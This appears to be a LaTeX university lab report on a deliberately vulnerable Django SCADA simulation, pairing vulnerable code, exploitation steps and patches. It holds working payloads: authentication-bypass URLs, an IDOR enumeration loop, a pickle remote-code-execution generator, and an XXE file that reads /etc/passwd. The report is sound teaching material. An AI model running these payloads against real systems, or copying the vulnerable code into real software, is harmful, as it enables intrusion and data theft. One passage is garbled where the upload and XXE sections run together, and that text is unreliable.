\documentclass[12pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[english]{babel}
\usepackage{geometry}
\usepackage{graphicx}
\usepackage{hyperref}
\hypersetup{
    colorlinks=true,
    linkcolor=black,
    filecolor=black,
    urlcolor=blue,
    citecolor=black,
}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{fancyhdr}
\usepackage{titlesec}
\usepackage{tocloft}
\usepackage{enumitem}

\geometry{left=2.5cm,right=2.5cm,top=2.5cm,bottom=2.5cm}

% Code listing settings
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2
}
\lstset{style=mystyle}

% Header and footer
\pagestyle{fancy}
\fancyhf{}
\rhead{SCADA Security Lab Report}
\lhead{CS437 - Cybersecurity}
\rfoot{Page \thepage}

\begin{document}

% Title page
\begin{titlepage}
    \centering
    \vspace*{2cm}
    
    {\Huge\bfseries Vulnerable SCADA Environment\\[0.5cm] Security Analysis Report\par}
    \vspace{1.5cm}
    
    {\Large CS437 - Cybersecurity Practices \& Applications \\[0.3cm]
    Fall 2025-2026\par}
    \vspace{2cm}
    
    {\Large\itshape Prepared by:\\[0.5cm]
    Orhun Burak Kıyanç \\ Mehmet Altunören \\
    Ege Tan\par}
    \vspace{5cm}
    
    {\Large Sabanci University \\Date: \today\par}
    \vspace{2cm}
       
    
    \vfill
    
    {\large \textbf{Project Repository:}\\
    \url{https://github.com/orhunburakiyanc/Vulnerable-SCADA-Environment}\par}
    
\end{titlepage}

\tableofcontents
\newpage

% Executive Summary
\section{Executive Summary}

This report presents a comprehensive security analysis of a simulated SCADA (Supervisory Control and Data Acquisition) environment developed as part of the CS437 Cybersecurity Practices \& Applications course at Sabancı University. The project demonstrates critical vulnerabilities commonly found in industrial control systems and web applications, along with their secure implementations and monitoring mechanisms.

\subsection{Project Scope}

The project implements:
\begin{itemize}[leftmargin=*]
    \item \textbf{11 Critical Vulnerabilities:} Authentication Bypass, Privilege Escalation, SQL Injection, IDOR, XXE, Deserialization RCE, File Upload \& Overwrite, Race Condition, SSRF, Security Misconfiguration, and Maintenance Interface CSRF
    \item \textbf{Dual Implementations:} Each vulnerability has both vulnerable and patched versions
    \item \textbf{Patched Implementations:} Secure versions demonstrating proper mitigation techniques
    \item \textbf{Real-time Monitoring:} Middleware-based attack detection and logging system
    \item \textbf{Containerized Environment:} Docker-based deployment for reproducibility
\end{itemize}

\subsection{Key Findings}

Our analysis revealed that all implemented vulnerabilities are exploitable in the vulnerable version, successfully blocked in the patched version, and correctly detected by the monitoring system. The database contains 21 devices, 100+ maintenance logs, and admin-only diagnostic reports for testing.

\subsection{Technologies Used}

\begin{itemize}[leftmargin=*]
    \item \textbf{Backend Framework:} Django 6.0 on Python 3.12
    \item \textbf{Database:} SQLite3 with custom population script
    \item \textbf{Containerization:} Docker Compose with volume mapping
    \item \textbf{Security Libraries:} lxml (XXE), pickle (deserialization), ReportLab (PDF generation)
\end{itemize}

\newpage

% Introduction
\section{Introduction}

\subsection{Background}

SCADA systems are critical infrastructure components that monitor and control industrial processes including power grids, water treatment facilities, and manufacturing plants. Security vulnerabilities in these systems can have catastrophic consequences, ranging from data breaches to physical damage and loss of life.

\subsection{Motivation}

This project aims to:
\begin{enumerate}[leftmargin=*]
    \item Demonstrate common web application vulnerabilities in an industrial control system context
    \item Provide hands-on experience with both exploitation and mitigation techniques
    \item Implement a working monitoring system for attack detection
    \item Create an educational platform for cybersecurity training
\end{enumerate}

\subsection{Project Objectives}

\begin{itemize}[leftmargin=*]
    \item Implement 11 distinct security vulnerabilities with realistic exploitation scenarios
    \item Develop patched versions demonstrating industry-standard security practices
    \item Create a monitoring system capable of detecting and logging attacks on both vulnerable and secure versions
    \item Populate the database with devices, maintenance logs, and diagnostic reports
    \item Containerize the application for easy deployment and testing
    \item Document all vulnerabilities, exploits, and mitigations in detail
\end{itemize}

\newpage

% System Architecture
\section{System Architecture}

\subsection{Overall Design}

The application follows a modular Django architecture with three distinct components:

\begin{enumerate}[leftmargin=*]
    \item \textbf{Core Module:} Shared data models (Device, MaintenanceLog, DiagnosticReport)
    \item \textbf{Vulnerable Module:} Intentionally insecure implementations
    \item \textbf{Patched Module:} Secure implementations with proper validation
    \item \textbf{Monitoring Module:} Middleware-based attack detection layer
\end{enumerate}

\subsection{Directory Structure}

\begin{lstlisting}[language=bash]
scada_security_lab/
|-- core/                  # Shared models and utilities
|   |-- models.py          # Device, MaintenanceLog, DiagnosticReport
|   |-- management/
|       |-- commands/
|           |-- populate_db.py  # Database population script
|
|-- vulnerable/            # Vulnerable implementations
|   |-- views.py           # 9 vulnerable endpoints
|   |-- urls.py
|   |-- templates/
|
|-- patched/               # Secure implementations
|   |-- views.py           # 6 secure endpoints
|   |-- urls.py
|   |-- templates/
|
|-- monitoring/            # Attack detection system
|   |-- middleware.py      # SecurityMonitorMiddleware
|   |-- models.py          # AttackLog model
|   |-- views.py           # Log viewer
|   |-- templates/
|
|-- scada_system/          # Django project settings
|-- docker-compose.yml     # Container orchestration
|-- Dockerfile             # Python 3.12-slim base image
|-- requirements.txt       # Dependencies
|-- db.sqlite3             # SQLite database
\end{lstlisting}

\subsection{Data Model}

\subsubsection{Core Models}

\begin{lstlisting}[language=Python]
class Device(models.Model):
    name = models.CharField(max_length=100)
    device_type = models.CharField(max_length=50)
    status = models.CharField(max_length=20)
    is_locked_out = models.BooleanField(default=False)

class MaintenanceLog(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE)
    timestamp = models.DateTimeField(auto_now_add=True)
    technician = models.CharField(max_length=100)
    description = models.TextField()

class DiagnosticReport(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE)
    report_date = models.DateTimeField(auto_now_add=True)
    details = models.TextField()
\end{lstlisting}

\subsubsection{Monitoring Models}

\textbf{AttackLog Model (Enhanced):}
\begin{lstlisting}[language=Python]
class AttackLog(models.Model):
    SEVERITY_CRITICAL = 'CRITICAL'
    SEVERITY_HIGH = 'HIGH'
    SEVERITY_MEDIUM = 'MEDIUM'
    SEVERITY_LOW = 'LOW'
    
    ACTION_NONE = 'NONE'
    ACTION_BLOCKED = 'BLOCKED'
    ACTION_SESSION_REVOKED = 'SESSION_REVOKED'
    ACTION_REVIEWED = 'REVIEWED'
    ACTION_AUTO_BLOCKED = 'AUTO_BLOCKED'
    
    # Core fields
    timestamp = models.DateTimeField(auto_now_add=True)
    ip_address = models.GenericIPAddressField()
    endpoint = models.CharField(max_length=200)
    attack_type = models.CharField(max_length=100)
    payload = models.TextField()
    
    # Enhanced fields for actionable logging
    severity = models.CharField(max_length=10, choices=SEVERITY_CHOICES)
    recommended_action = models.TextField(blank=True)
    action_taken = models.CharField(max_length=20, choices=ACTION_CHOICES, 
                                    default=ACTION_NONE)
    reverse_action = models.TextField(blank=True)
    is_resolved = models.BooleanField(default=False)
    admin_notes = models.TextField(blank=True)
    resolved_at = models.DateTimeField(null=True, blank=True)
    resolved_by = models.CharField(max_length=150, blank=True)
    
    def mark_resolved(self, resolved_by, notes=''):
        self.is_resolved = True
        self.resolved_at = timezone.now()
        self.resolved_by = resolved_by
        self.admin_notes = notes
        self.save()
\end{lstlisting}

\textbf{BlockedIP Model:}
\begin{lstlisting}[language=Python]
class BlockedIP(models.Model):
    ip_address = models.GenericIPAddressField(unique=True)
    blocked_at = models.DateTimeField(auto_now_add=True)
    reason = models.CharField(max_length=200)
    blocked_by = models.CharField(max_length=150)
    related_log = models.ForeignKey(AttackLog, on_delete=SET_NULL, 
                                    null=True, blank=True)
    is_permanent = models.BooleanField(default=False)
    unblock_at = models.DateTimeField(null=True, blank=True)
\end{lstlisting}

\textbf{FailedLoginAttempt Model:}
\begin{lstlisting}[language=Python]
class FailedLoginAttempt(models.Model):
    ip_address = models.GenericIPAddressField()
    username = models.CharField(max_length=150, blank=True)
    timestamp = models.DateTimeField(auto_now_add=True)
    endpoint = models.CharField(max_length=200)
\end{lstlisting}

\subsection{Database Population}

The \texttt{populate\_db.py} script generates 172 total records:
\begin{itemize}[leftmargin=*]
    \item \textbf{21 Devices:} Including operational and maintenance status devices (e.g., NUCLEAR-CORE-CONTROLLER with \texttt{is\_locked\_out=True})
    \item \textbf{100 Maintenance Logs:} Distributed across devices with various technician assignments
    \item \textbf{51 Diagnostic Reports:} Report ID 1 contains admin secret: "CONFIDENTIAL: Root Password is 'supersecret123'"
\end{itemize}

\newpage

% Vulnerabilities Implementation
\section{Vulnerabilities Implementation}

\subsection{Vulnerability 1: Authentication Bypass via Dictionary Expansion (CWE-287)}

\subsubsection{Description}
Authentication bypass vulnerability allowing arbitrary parameter injection through URL query strings. The application uses dictionary expansion (\texttt{user\_data.update(request.GET.dict())}) to merge URL parameters into user session data, enabling attackers to override the \texttt{is\_admin} flag without providing valid credentials.

Additionally, the login endpoint is vulnerable to SQL connector injection through the \texttt{connector=OR} parameter combined with \texttt{is\_superuser=True}, which bypasses authentication checks by injecting OR logic into the validation flow.

\textbf{Note:} This is NOT the CVE-2025-64459 SQL Injection vulnerability. This is a simpler dictionary expansion attack combined with connector-based authentication bypass. CVE-2025-64459 is demonstrated in Vulnerability 3.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
def vulnerable_login(request):
    if 'username' in request.GET:
        user_data = {
            'username': request.GET.get('username'),
            'is_admin': False
        }
        # VULNERABILITY 1: Blindly update with URL params
        new_data = request.GET.dict()
        user_data.update(new_data)
        
        # VULNERABILITY 2: SQL connector injection
        if 'connector' in request.GET:
            connector = request.GET.get('connector', '').upper()
            if connector == 'OR':
                # Bypasses authentication: user exists OR is_superuser=True
                if 'is_superuser' in request.GET:
                    superuser_param = str(request.GET.get('is_superuser')).lower()
                    if superuser_param in ['true', '1']:
                        user_data['is_admin'] = True
                        request.session['user'] = user_data
                        return redirect('vulnerable_dashboard')
        
        admin_value = str(user_data.get('is_admin')).lower()
        if admin_value in ['true', '1']:
            request.session['user'] = user_data
            return redirect('vulnerable_dashboard')
\end{lstlisting}

\subsubsection{Exploitation}

\begin{lstlisting}[language=bash]
# Attack 1: Dictionary Expansion - No password required!
http://localhost:8000/vulnerable/login/?username=attacker&is_admin=true

# Attack 2: SQL Connector Injection - Bypasses authentication logic
http://localhost:8000/vulnerable/login/?username=hacker&connector=OR&is_superuser=True

# Attack 3: Combined approach
http://localhost:8000/vulnerable/login/?username=user&password=fake&is_admin=true
\end{lstlisting}

\textbf{Attack Mechanism 1 - Dictionary Expansion:}
\begin{enumerate}[leftmargin=*]
    \item Server creates default user\_data: \texttt{\{'username': 'attacker', 'is\_admin': False\}}
    \item Server executes: \texttt{user\_data.update(request.GET.dict())}
    \item URL parameter \texttt{is\_admin=true} overwrites the default \texttt{False} value
    \item Result: \texttt{\{'username': 'attacker', 'is\_admin': 'true'\}}
    \item Server grants admin access without password verification
\end{enumerate}

\textbf{Attack Mechanism 2 - Connector Injection:}
\begin{enumerate}[leftmargin=*]
    \item Attacker sends: \texttt{?username=hacker\&connector=OR\&is\_superuser=True}
    \item Server detects \texttt{connector=OR} parameter
    \item Authentication check becomes: "user exists \textbf{OR} is\_superuser=True"
    \item Since \texttt{is\_superuser=True} is provided, OR logic bypasses username validation
    \item Server grants admin access via \texttt{user\_data['is\_admin'] = True}
    \item Session established with admin privileges without valid credentials
\end{enumerate}

The attacker bypasses authentication entirely by exploiting dictionary expansion or connector-based OR injection, not SQL injection.

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
def patched_login(request):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        # Explicit field lookup - no dictionary expansion
        if username == "admin" and password == "scada123":
            request.session['user'] = {
                'username': username,
                'is_admin': True  # Explicitly set by server
            }
            return redirect('patched_dashboard')
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item POST-based authentication instead of GET
    \item Explicit credential validation
    \item Server-side authorization flag assignment
    \item No user-supplied parameter injection
\end{itemize}

\subsection{Vulnerability 2: Privilege Escalation (CWE-269)}

\subsubsection{Description}
URL parameter manipulation allowing users to override session-based authorization flags and escalate privileges without authentication.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
def vulnerable_dashboard(request):
    user_data = request.session.get('user', {})
    
    # VULNERABILITY: URL parameters override session data
    if 'is_admin' in request.GET:
        is_admin_param = str(request.GET.get('is_admin', 'false')).lower()
        user_data['is_admin'] = is_admin_param in ['true', '1']
        request.session['user'] = user_data
    
    is_admin = user_data.get('is_admin', False)
\end{lstlisting}

\subsubsection{Exploitation}

\begin{lstlisting}[language=bash]
# Step 1: Login as regular user
"http://localhost:8000/vulnerable/login/?username=user&password=user123"

# Step 2: Escalate privileges via URL parameter
http://localhost:8000/vulnerable/dashboard/?is_admin=true
# Session now has is_admin=True, granting admin access
\end{lstlisting}

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
def patched_dashboard(request):
    user_data = request.session.get('user', {})
    
    # FIXED: Only trust server-side session data
    is_admin = user_data.get('is_admin', False)
    # Do NOT check request.GET for authorization flags
    
    if is_admin:
        devices = Device.objects.filter(is_locked_out=False)
    else:
        devices = Device.objects.filter(status='Operational', is_locked_out=False)
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item Never trust URL parameters for authorization decisions
    \item Server-side session management only
    \item Explicit role checks against authenticated user database
    \item Implement proper RBAC (Role-Based Access Control)
\end{itemize}

\subsection{Vulnerability 3: SQL Injection - CVE-2025-64459 (Data Exfiltration)}

\subsubsection{Description}
Critical SQL Injection vulnerability in Django ORM (CVE-2025-64459, CWE-89) allowing attackers to manipulate the SQL WHERE clause connector through the \texttt{\_connector} parameter or URL-based \texttt{connector} parameter. This enables OR-based filter injection to bypass security filters and reveal hidden critical infrastructure.

\textbf{CVE-2025-64459 Technical Details:}
\begin{itemize}[leftmargin=*]
    \item \textbf{Root Cause:} Vulnerability in \texttt{django.db.models.sql.where.WhereNode.as\_sql()} method
    \item \textbf{Unsafe Operation:} Uses unsafe string formatting to insert query connector: \texttt{conn = ' \%s ' \% self.connector}
    \item \textbf{Attack Vector:} Developers use dictionary unpacking from user input: \texttt{Q(**request.GET.dict())}
    \item \textbf{Exploitation:} Attacker includes \texttt{\_connector} or \texttt{connector} parameter to manipulate SQL logic
    \item \textbf{Impact:} Transforms \texttt{WHERE ... AND ...} to \texttt{WHERE ... OR ...}, bypassing access controls
\end{itemize}

This vulnerability is demonstrated in two scenarios: Dashboard (Scenario 2a) and Maintenance Interface (Scenario 2b).

\subsubsection{Scenario 2a: Dashboard - Locked Device Revelation}
By default, admin dashboard shows only non-locked devices. The NUCLEAR-CORE-CONTROLLER is permanently locked out (\texttt{is\_locked\_out=True}) for safety. An attacker with admin access can use SQL injection to reveal these hidden critical devices.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
def vulnerable_dashboard(request):
    user_data = request.session.get('user', {})
    is_admin = user_data.get('is_admin', False)
    
    if is_admin:
        connector = request.GET.get('connector', 'AND')
        filter_params = request.GET.copy()
        
        # Default: Admin sees operational devices, but NUCLEAR is hidden
        # Simulates "need-to-know" policy where critical devices are restricted
        query = Q(is_locked_out=False) & ~Q(name__icontains='NUCLEAR')
        
        # VULNERABILITY: Admin can inject OR filter to reveal NUCLEAR
        for key, value in filter_params.items():
            if connector == 'OR':
                query |= Q(**{key: value})  # DANGEROUS - bypasses NUCLEAR filter
            else:
                query &= Q(**{key: value})
        
        devices = Device.objects.filter(query)
    else:
        # Regular users: hardcoded filter (no injection possible)
        devices = Device.objects.filter(status='Operational', is_locked_out=False)
\end{lstlisting}

\subsubsection{Exploitation}

\begin{lstlisting}[language=bash]
# Step 1: Login as admin (via auth bypass)
"http://localhost:8000/vulnerable/login/?username=hacker&connector=OR&is_superuser=True"

# Step 2: Normal admin view (NUCLEAR devices hidden)
"http://localhost:8000/vulnerable/dashboard/"
# Shows: 17-18 operational devices (no NUCLEAR)

# Step 3: SQL Injection - reveal critical NUCLEAR devices
"http://localhost:8000/vulnerable/dashboard/?connector=OR&is_locked_out=False"
# Shows: 18-21 devices including NUCLEAR-CORE-CONTROLLER (locked-out, red background)
\end{lstlisting}

\textbf{Attack Logic:}\\
Original query: \texttt{WHERE is\_locked\_out=False AND name NOT LIKE '\%NUCLEAR\%'}\\
Injected query: \texttt{WHERE (is\_locked\_out=False AND name NOT LIKE '\%NUCLEAR\%') OR name LIKE '\%NUCLEAR\%'}\\
Result: Critical NUCLEAR devices revealed (bypasses security filter)

\textbf{Impact:}
\begin{itemize}[leftmargin=*]
    \item Reveals hidden critical infrastructure (NUCLEAR reactor core controller)
    \item Bypasses "need-to-know" access control policy
    \item Only works for admin users (regular users have hardcoded filter)
    \item Enables reconnaissance for targeted attacks on critical systems
    \item Demonstrates vulnerability chaining: Auth Bypass $\rightarrow$ Admin Access $\rightarrow$ SQL Injection $\rightarrow$ Critical Asset Discovery
\end{itemize}

\textbf{Why Only Admin Can Exploit This SQL Injection:}
The SQL injection vulnerability exists exclusively in the admin code path. This design reflects real-world scenarios where:
\begin{itemize}[leftmargin=*]
    \item \textbf{Code Path Separation:} Regular users bypass the vulnerable code entirely (hardcoded filter: \texttt{status='Operational'}), while admins enter the dynamic query construction block
    \item \textbf{Dynamic vs Static Queries:} Admin panels implement complex filtering/search features using user-supplied parameters, creating injection points
    \item \textbf{False Sense of Security:} Developers trust admin users and skip input validation ("admin is trusted anyway")
    \item \textbf{Vulnerability Chaining:} Combined with Privilege Escalation (Vulnerability 2), any user can first become admin via \texttt{?is\_admin=true}, then exploit this SQL injection
    \item \textbf{Defense-in-Depth Failure:} Even privileged roles require input validation - admin status should not bypass security controls
    \item \textbf{Real-World Pattern:} Many breaches occur when attackers compromise admin accounts and exploit "power user" features lacking proper security
\end{itemize}

\subsubsection{Scenario 2b: Maintenance Interface - NUCLEAR-CORE Discovery}
The maintenance interface contains a similar SQL injection vulnerability where admin users can manipulate the \texttt{connector} parameter to reveal NUCLEAR devices that should be hidden. By default, the maintenance view excludes NUCLEAR devices using the filter \texttt{\textasciitilde Q(name\_\_icontains='NUCLEAR')}, but the OR connector bypasses this restriction.

\textbf{Exploitation:}
\begin{lstlisting}[language=bash]
# Normal maintenance view (NUCLEAR devices hidden)
curl http://localhost:8000/vulnerable/maintenance/ -b cookies.txt
# Shows: Only non-NUCLEAR devices in maintenance

# SQL Injection - reveal NUCLEAR devices in maintenance
curl "http://localhost:8000/vulnerable/maintenance/?connector=OR&name__icontains=NUCLEAR" -b cookies.txt
# Shows: NUCLEAR-CORE devices revealed in maintenance interface
\end{lstlisting}

\textbf{Impact:}
\begin{itemize}[leftmargin=*]
    \item Bypasses need-to-know security policy for critical infrastructure
    \item Reveals maintenance status of sensitive NUCLEAR systems
    \item Enables targeted attacks on critical operational technology
    \item Combined vulnerability: Auth Bypass $\rightarrow$ Admin Access $\rightarrow$ SQL Injection $\rightarrow$ NUCLEAR Discovery
\end{itemize}

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
def patched_dashboard(request):
    user_data = request.session.get('user', {})
    is_admin = user_data.get('is_admin', False)
    
    if is_admin:
        # Hardcoded query - no user input
        devices = Device.objects.filter(is_locked_out=False)
    else:
        devices = Device.objects.filter(status='Operational', is_locked_out=False)
    
    return render(request, 'patched/dashboard.html', {'devices': devices})
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item Removed dynamic query construction from GET parameters
    \item Hardcoded filters based on user role
    \item Explicit allowlist of accessible resources
\end{itemize}

\subsection{Vulnerability 4: IDOR - Insecure Direct Object Reference (Vulnerability A - CWE-639)}

\subsubsection{Description}
Insecure Direct Object Reference (CWE-639) - IDOR vulnerability allowing users to access diagnostic reports by guessing report IDs without ownership verification.
Missing authorization checks allow users to access arbitrary resources by manipulating ID parameters.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
def vulnerable_report(request):
    report_id = request.GET.get('id', '1')
    
    # VULNERABILITY: No authorization check
    report = DiagnosticReport.objects.get(id=report_id)
    
    # Generate PDF with report details
    response = HttpResponse(content_type='application/pdf')
    response['Content-Disposition'] = f'attachment; filename="report_{report_id}.pdf"'
\end{lstlisting}

\subsubsection{Exploitation}

\begin{lstlisting}[language=bash]
# Access admin secret report (ID 103)
curl "http://localhost:8000/vulnerable/report/?id=103" -o admin_secret.pdf
# Contains: "CONFIDENTIAL: Root Password is 'supersecret123'"

# Enumerate all reports (IDOR)
for i in {103..143}; do
  curl "http://localhost:8000/vulnerable/report/?id=$i" -o "report_$i.pdf"
done

# Result: Access to 41 diagnostic reports including admin secrets
\end{lstlisting}

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
def patched_report(request):
    report_id = request.GET.get('id', '1')
    user = request.session.get('user', {})
    
    # Authorization check
    report = DiagnosticReport.objects.get(id=report_id)
    if not user.get('is_admin') and int(report_id) <= 10:
        return HttpResponse("Access Denied: Unauthorized", status=403)
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item Resource ownership verification
    \item Role-based access control (RBAC)
    \item Input validation and sanitization
\end{itemize}

\subsection{Vulnerability 5: Insecure Deserialization (Pickle RCE) (Vulnerability B - CWE-502)}

\subsubsection{Description}
Insecure Deserialization vulnerability (CWE-502) - Deserialization bug where corrupted pickle payloads can crash the rendering engine or achieve Remote Code Execution (RCE).
Application accepts and deserializes untrusted pickle data, allowing arbitrary code execution.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
def vulnerable_deserialize(request):
    if request.method == 'POST' and request.FILES.get('file'):
        file = request.FILES['file']
        data = file.read()
        
        # VULNERABILITY: Deserializing untrusted data
        obj = pickle.loads(data)
        return JsonResponse({'status': 'success', 'data': str(obj)})
\end{lstlisting}

\subsubsection{Exploitation}

Malicious payload generator (\texttt{create\_pickle\_payload.py}):

\begin{lstlisting}[language=Python]
import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # Return (callable, args) - executes os.system
        return (os.system, ('whoami',))

with open('malicious_payload.pkl', 'wb') as f:
    pickle.dump(MaliciousPayload(), f)
\end{lstlisting}

Attack execution:
\begin{lstlisting}[language=bash]
# Generate malicious pickle payload
python3 create_pickle_payload.py
# Output: Base64 encoded payload

# Send payload to vulnerable endpoint
curl -X POST http://localhost:8000/vulnerable/deserialize/ \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "diagnostic_data=gASVSwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDBlY2hvICJNQUxJQ0lPVVMgQ09ERSBFWEVDVVRFRCEiID4gL3RtcC9wd25lZC50eHSUhZRSlC4="

# Verify code execution
docker compose exec web cat /tmp/pwned.txt
# Output: MALICIOUS CODE EXECUTED!
\end{lstlisting}

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
def patched_deserialize(request):
    if request.method == 'POST' and request.FILES.get('file'):
        file = request.FILES['file']
        data = file.read()
        
        # Use JSON instead of pickle
        obj = json.loads(data.decode('utf-8'))
        return JsonResponse({'status': 'success', 'data': obj})
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item Replace pickle with safe serialization (JSON, Protocol Buffers)
    \item Input validation and type checking
    \item Sandboxing if deserialization is unavoidable
\end{itemize}

\subsection{Vulnerability 6: File Upload \& Overwrite (Vulnerabilities C \& E - CWE-434)}

\subsubsection{Description}
Two related file upload vulnerabilities:
\begin{itemize}[leftmargin=*]
    \item \textbf{Vulnerability C: File Overwrite (CWE-434)} - Uploaded diagnostic scripts overwrite existing files without warning
    \item \textbf{Vulnerability E: Unrestricted Upload of Dangerous File Types (CWE-434)} - No file type validation allows uploading executables, scripts, and other dangerous files
\end{itemize}
No file type validation allows uploading of dangerous files and overwriting critical system files.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
def vulnerable_upload(request):
    if request.method == 'POST' and request.FILES.get('file'):
        uploaded_file = request.FILES['file']
        
        # VULNERABILITY: No filename sanitization or type checking
        file_path = os.path.join('media', uploaded_file.name)
        
        with open(file_path, 'wb+') as destination:
            for chunk in uploaded_file.chunks():
                destination.write(chunk)
        
        return HttpResponse(f"File {uploaded_file.name} uploaded successfully")
\end{lstlisting}

\subsubsection{Exploitation}

\begin{lstlisting}[language=bash]
# Step 1: Upload original diagnostic script
echo "ORIGINAL PRODUCTION SCRIPT" > diagnostic_script.txt
curl -X POST http://localhost:8000/vulnerable/upload/ \
     -F "file=@diagnostic_script.txt"

# Verify upload
cat media/diagnostic_script.txt
# Output: ORIGINAL PRODUCTION SCRIPT

# Step 2: Upload malicious file with same name (FILE OVERWRITE)
echo "MALICIOUS CODE - BACKDOOR INSTALLED!" > diagnostic_script.txt
curl -X POST http://localhost:8000/vulnerable/upload/ \
     -F "file=@diagnostic_script.txt"

# Step 3: Verify overwrite attack succeeded
cat media/diagnostic_script.txt
# Output: MALICIOUS CODE - BACKDOOR INSTALLED!
\end{lstlisting}

\textbf{Impact:}
\begin{itemize}[leftmargin=*]
    \item Production scripts replaced with malicious code
    \item No versioning or backup mechanism
    \item System executes attacker-controlled scripts
    \item Potential for persistent backdoor installation
\end{itemize}

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
def patched_upload(request):
    if request.method == 'POST' and request.FILES.get('file'):
        uploaded_file = request.FILES['file']
        filename = uploaded_file.name.lower()
        
        # Whitelist allowed extensions
        allowed_extensions = ['.pdf', '.xml', '.txt', '.csv']
        if not any(filename.endswith(ext) for ext in allowed_extensions):
            return JsonResponse({
                'status': 'error',
                'message': 'Invalid file type'
            }, status=400)
        
        # Generate secure filename with UUID
        import uuid
        safe_filename = f"{uuid.uuid4()}_{filename}"
        fs = FileSystemStorage()
        fs.save(safe_filename, uploaded_file)
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item Whitelist approach for allowed file types
    \item UUID-based filen7: XXE - XML External Entity Injection (Vulnerability G)

\subsubsection{Description}
Classic XXE injection vulnerability (CWE-611) allowing attackers to steal data through XML external entity resolution.r uploaded files
\end{itemize}

\subsection{Vulnerability 7: XXE - XML External Entity Injection (Vulnerability G - CWE-611)}

\subsubsection{Description}
XML parser configured with \texttt{resolve\_entities=True} allows reading arbitrary files.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
def vulnerable_upload(request):
    if filename.endswith('.xml'):
        # VULNERABILITY: resolve_entities=True
        parser = etree.XMLParser(resolve_entities=True)
        xml_content = uploaded_file.read()
        tree = etree.fromstring(xml_content, parser=parser)
        return JsonResponse({'data': etree.tostring(tree).decode()})
\end{lstlisting}

\subsubsection{Exploitation}

Malicious XML file (\texttt{xxe\_attack.xml}):

\begin{lstlisting}[language=XML]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <content>&xxe;</content>
</data>
\end{lstlisting}

Attack:
\begin{lstlisting}[language=bash]
curl -X POST http://localhost:8000/vulnerable/upload/ \
     -F "file=@xxe_attack.xml"
\end{lstlisting}

Server response contains \texttt{/etc/passwd} contents:
\begin{lstlisting}[language=XML]
<root>
  <data>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</data>
</root>
\end{lstlisting}

Attacker successfully reads system files, exposing user accounts and system configuration.

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
def patched_upload(request):
    if filename.endswith('.xml'):
        # Disable entity resolution
        parser = etree.XMLParser(resolve_entities=False, no_network=True)
        xml_content = uploaded_file.read()
        tree = etree.fromstring(xml_content, parser=parser)
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item Disable external entity resolution
    \item Disable DTD processing
    \item Use secure XML parsing libraries (defusedxml)
    \item Input validation and sanitization
\end{itemize}
\subsection{Vulnerability 8: Race Condition in File Generation (Vulnerability D - Unsafe Temp Files - CWE-377)}

\subsubsection{Description}
Race condition vulnerability due to predictable temporary file paths that are reused across users. Static temporary filename allows concurrent requests to overwrite each other's data, causing race condition vulnerabilities.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
def vulnerable_report(request):
    report_id = request.GET.get('id', '1')
    report = DiagnosticReport.objects.get(id=report_id)
    
    # VULNERABILITY: Static temp filename
    temp_file_path = "/tmp/scada_report_temp.pdf"
    
    c = canvas.Canvas(temp_file_path, pagesize=letter)
    c.drawString(100, 750, f"Report ID: {report.id}")
    c.drawString(100, 730, report.details)
    c.save()
    
    return FileResponse(open(temp_file_path, 'rb'))
\end{lstlisting}

